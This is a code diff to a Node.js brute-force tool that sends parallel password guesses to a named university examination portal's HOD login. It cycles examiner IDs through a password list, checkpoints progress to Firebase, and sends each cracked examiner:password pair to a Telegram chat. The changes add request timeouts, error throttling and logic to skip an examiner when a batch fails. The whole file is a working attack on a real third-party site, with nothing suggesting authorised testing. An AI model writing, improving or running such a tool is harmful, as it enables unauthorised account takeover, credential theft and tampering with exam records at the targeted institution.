@@ -12,17 +12,18 @@ const { promisify } = require('util');
 const writeFileAsync = promisify(fs.writeFile);
 const readFileAsync = promisify(fs.readFile);
 
-// ========== CONFIG ==========
+// ========== CONFIGURATION ==========
 const PORT = process.env.PORT || 3000;
 const LOGIN_URL = process.env.LOGIN_URL || 'https://lnmuniversity.com/Lnmu_CIA/Home/Login';
 const LOGIN_TYPE = process.env.LOGIN_TYPE || 'HOD';
 const PASSWORD_FILE = process.env.PASSWORD_FILE || './password.txt';
 const EXAMINER_FILE = process.env.EXAMINER_FILE || './examiners.json';
-const CONCURRENCY = parseInt(process.env.CONCURRENCY) || 30;
-const CHECKPOINT_INTERVAL = 500;   // save checkpoint after this many password attempts
-const PROGRESS_INTERVAL = 500;     // emit progress to UI after this many attempts
+const CONCURRENCY = parseInt(process.env.CONCURRENCY) || 30;          // parallel requests per batch
+const REQUEST_TIMEOUT = parseInt(process.env.REQUEST_TIMEOUT) || 4000; // ms
+const CHECKPOINT_INTERVAL = 500;   // save checkpoint after this many attempts
+const PROGRESS_INTERVAL = 500;     // emit progress UI update
 
-// ========== FIREBASE (with fallback) ==========
+// ========== FIREBASE (optional) ==========
 let db = null;
 let useFirebase = false;
 let bot = null;
@@ -34,7 +35,7 @@ try {
     admin.initializeApp({ credential: admin.credential.cert(serviceAccount) });
     db = admin.firestore();
     useFirebase = true;
-    console.log('✅ Firebase connected (checkpoint will sync to cloud)');
+    console.log('✅ Firebase connected (checkpoint sync to cloud)');
   } else {
     console.log('⚠️ No Firebase credentials – using local checkpoint.json');
   }
@@ -66,10 +67,10 @@ let speedStats = { attempts: 0, startTime: null };
 let lastProgressUpdate = 0;
 let lastCheckpointSave = 0;
 
-// HTTP Agent with keep-alive for speed
+// HTTP Agent with keep-alive
 const agent = new (require('http').Agent)({ keepAlive: true, maxSockets: 256 });
 const axiosInstance = axios.create({
-  timeout: 5000,
+  timeout: REQUEST_TIMEOUT,
   headers: { 'User-Agent': 'Mozilla/5.0', 'Connection': 'keep-alive' },
   httpAgent: agent,
   httpsAgent: agent
@@ -80,6 +81,7 @@ function loadExaminers() {
   const fullPath = path.resolve(EXAMINER_FILE);
   if (!fs.existsSync(fullPath)) {
     fs.writeFileSync(fullPath, JSON.stringify(['EC1032506'], null, 2));
+    console.log(`📝 Created sample examiners.json at ${fullPath}`);
   }
   const data = fs.readFileSync(fullPath, 'utf8');
   examinerIds = JSON.parse(data);
@@ -91,14 +93,15 @@ function loadPasswords() {
   const fullPath = path.resolve(PASSWORD_FILE);
   if (!fs.existsSync(fullPath)) {
     fs.writeFileSync(fullPath, 'admin123\npassword\n123456\n');
+    console.log(`📝 Created sample password.txt at ${fullPath}`);
   }
   const content = fs.readFileSync(fullPath, 'utf8');
   passwords = content.split(/\r?\n/).filter(l => l.trim().length > 0);
   console.log(`✅ Loaded ${passwords.length} passwords (${(content.length / 1024 / 1024).toFixed(2)} MB)`);
 }
 
-// ========== CHECKPOINT (Firebase + Local fallback) ==========
-async function saveCheckpoint(isFinal = false) {
+// ========== CHECKPOINT (Firebase + local fallback) ==========
+async function saveCheckpoint() {
   const checkpointData = {
     examinerIndex: currentExaminerIndex,
     passwordIndex: currentPasswordIndex,
@@ -107,17 +110,15 @@ async function saveCheckpoint(isFinal = false) {
     status: isPaused ? 'paused' : (isRunning ? 'running' : 'stopped')
   };
 
-  // Try Firebase first if available
   if (useFirebase) {
     try {
       await db.collection('checkpoint').doc('current').set(checkpointData, { merge: true });
       return;
     } catch (err) {
-      console.error('Firebase checkpoint save failed, falling back to local file', err.message);
-      // fall through to local file
+      console.error('Firebase checkpoint save failed, using local file', err.message);
     }
   }
-  // Local file fallback
+  // Local fallback
   try {
     await writeFileAsync('./checkpoint.json', JSON.stringify(checkpointData, null, 2));
   } catch (err) {
@@ -128,7 +129,6 @@ async function saveCheckpoint(isFinal = false) {
 async function loadCheckpoint() {
   let checkpointData = null;
 
-  // Try Firebase first
   if (useFirebase) {
     try {
       const doc = await db.collection('checkpoint').doc('current').get();
@@ -137,7 +137,6 @@ async function loadCheckpoint() {
       console.log('Firebase checkpoint load failed, trying local file', err.message);
     }
   }
-  // Fallback to local file
   if (!checkpointData && fs.existsSync('./checkpoint.json')) {
     try {
       const content = await readFileAsync('./checkpoint.json', 'utf8');
@@ -175,18 +174,27 @@ async function loadExistingSuccesses() {
   }
 }
 
-// ========== LOGIN ATTEMPT ==========
+// ========== LOGIN ATTEMPT WITH ABORT CONTROLLER ==========
 async function tryLogin(examinerId, password) {
+  const controller = new AbortController();
+  const timeoutId = setTimeout(() => controller.abort(), REQUEST_TIMEOUT);
+
   try {
     const res = await axiosInstance.post(LOGIN_URL, {
       loginType: LOGIN_TYPE,
       userid: examinerId,
       password: password
-    });
+    }, { signal: controller.signal });
+    clearTimeout(timeoutId);
     speedStats.attempts++;
     return { success: !res.data.includes('Invalid'), password };
   } catch (err) {
+    clearTimeout(timeoutId);
     speedStats.attempts++;
+    // Log every 100 errors to avoid spam
+    if (speedStats.attempts % 100 === 0) {
+      console.error(`Request error for ${examinerId}: ${err.code || err.message}`);
+    }
     return { success: false };
   }
 }
@@ -202,6 +210,13 @@ async function processExaminer(examinerId, startPwdIdx) {
     const promises = batch.map(pwd => tryLogin(examinerId, pwd));
     const results = await Promise.all(promises);
 
+    // Check if all requests in this batch failed – likely server issue, skip examiner
+    const allFailed = results.every(r => !r.success);
+    if (allFailed && batch.length > 0) {
+      console.warn(`⚠️ All ${batch.length} requests failed for ${examinerId} at password index ${pwdIdx}. Skipping this examiner.`);
+      break; // exit while, examiner will be marked as NOT found
+    }
+
     for (let i = 0; i < results.length; i++) {
       if (results[i].success) {
         foundPassword = results[i].password;
@@ -211,7 +226,7 @@ async function processExaminer(examinerId, startPwdIdx) {
     pwdIdx += batch.length;
     currentPasswordIndex = pwdIdx;
 
-    // Progress update (every PROGRESS_INTERVAL attempts)
+    // Progress update (throttled)
     const attemptsSinceLastProgress = speedStats.attempts - lastProgressUpdate;
     if (attemptsSinceLastProgress >= PROGRESS_INTERVAL || pwdIdx >= total) {
       const elapsed = (Date.now() - speedStats.startTime) / 1000;
@@ -227,11 +242,10 @@ async function processExaminer(examinerId, startPwdIdx) {
       lastProgressUpdate = speedStats.attempts;
     }
 
-    // Checkpoint save (non-blocking, every CHECKPOINT_INTERVAL attempts)
+    // Checkpoint save (non-blocking, throttled)
     const attemptsSinceLastSave = speedStats.attempts - lastCheckpointSave;
     if (attemptsSinceLastSave >= CHECKPOINT_INTERVAL || pwdIdx >= total) {
       lastCheckpointSave = speedStats.attempts;
-      // fire-and-forget: do not await
       saveCheckpoint().catch(e => console.error('Checkpoint save error:', e.message));
     }
   }
@@ -281,15 +295,17 @@ async function startAttack() {
         await bot.sendMessage(process.env.TELEGRAM_CHAT_ID, `✅ ${examinerId} : ${result.password}`)
           .catch(e => console.error('Telegram error:', e.message));
       }
+      console.log(`✅ Found for ${examinerId} : ${result.password}`);
+    } else {
+      console.log(`❌ No password found for ${examinerId}`);
     }
-    // Reset for next examiner
+    // Reset password index for next examiner
     currentPasswordIndex = 0;
-    // Save checkpoint after finishing an examiner (non-blocking)
     saveCheckpoint().catch(e => console.error('Checkpoint save error:', e.message));
   }
 
   isRunning = false;
-  await saveCheckpoint(true);
+  await saveCheckpoint();
   io.emit('status', { running: false, paused: false });
   console.log('🏁 Attack finished');
 }
@@ -330,7 +346,7 @@ io.on('connection', (socket) => {
     currentExaminerIndex = 0;
     currentPasswordIndex = 0;
     successes.clear();
-    await saveCheckpoint(true);
+    await saveCheckpoint();
     io.emit('init', {
       totalExaminers,
       successes: [],
